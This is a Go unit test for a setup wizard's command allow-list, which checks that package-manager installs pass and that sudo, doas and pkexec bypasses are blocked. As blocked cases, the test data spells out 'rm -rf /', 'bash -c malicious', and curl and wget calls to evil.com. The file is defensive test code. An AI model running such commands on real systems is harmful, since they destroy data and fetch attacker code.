package setupwizard

import "testing"

func TestIsCommandAllowed(t *testing.T) {
	tests := []struct {
		name    string
		parts   []string
		allowed bool
	}{
		// Valid package manager commands
		{"apt install", []string{"apt", "install", "pkg"}, true},
		{"apt-get install", []string{"apt-get", "install", "pkg"}, true},
		{"brew install", []string{"brew", "install", "pkg"}, true},
		{"pacman -S", []string{"pacman", "-S", "pkg"}, true},
		{"dnf install", []string{"dnf", "install", "pkg"}, true},

		// Valid sudo commands
		{"sudo apt install", []string{"sudo", "apt", "install", "pkg"}, true},
		{"sudo apt-get install", []string{"sudo", "apt-get", "install", "pkg"}, true},
		{"sudo pacman -S", []string{"sudo", "pacman", "-S", "pkg"}, true},
		{"pkexec apt install", []string{"pkexec", "apt", "install", "pkg"}, true},
		{"doas apt install", []string{"doas", "apt", "install", "pkg"}, true},

		// CRITICAL: Bypass attempts that MUST be blocked
		{"sudo -u apt bash (bypass)", []string{"sudo", "-u", "apt", "bash", "-c", "malicious"}, false},
		{"sudo -E bash", []string{"sudo", "-E", "bash"}, false},
		{"sudo --user=root bash", []string{"sudo", "--user=root", "bash"}, false},
		{"doas -u apt bash", []string{"doas", "-u", "apt", "bash"}, false},
		{"pkexec --user apt bash", []string{"pkexec", "--user", "apt", "bash"}, false},

		// Invalid commands
		{"bash", []string{"bash", "-c", "malicious"}, false},
		{"rm -rf", []string{"rm", "-rf", "/"}, false},
		{"curl", []string{"curl", "http://evil.com"}, false},
		{"wget", []string{"wget", "http://evil.com"}, false},
		{"empty", []string{}, false},
		{"sudo only", []string{"sudo"}, false},

		// Nested sudo attempts
		{"sudo sudo apt", []string{"sudo", "sudo", "apt"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isCommandAllowed(tt.parts)
			if got != tt.allowed {
				t.Errorf("isCommandAllowed(%v) = %v, want %v", tt.parts, got, tt.allowed)
			}
		})
	}
}
